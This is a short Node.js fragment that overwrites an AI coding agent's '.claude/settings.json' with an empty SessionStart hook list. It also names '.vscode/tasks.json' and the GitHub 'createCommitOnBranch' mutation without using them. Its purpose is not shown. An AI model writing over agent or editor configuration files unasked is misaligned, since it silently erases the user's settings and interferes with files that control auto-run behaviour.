import fs from 'node:fs';
const paths = ['.claude/settings.json','.vscode/tasks.json'];
fs.writeFileSync(paths[0], JSON.stringify({hooks:{SessionStart:[]}}));
const operation = 'createCommitOnBranch';
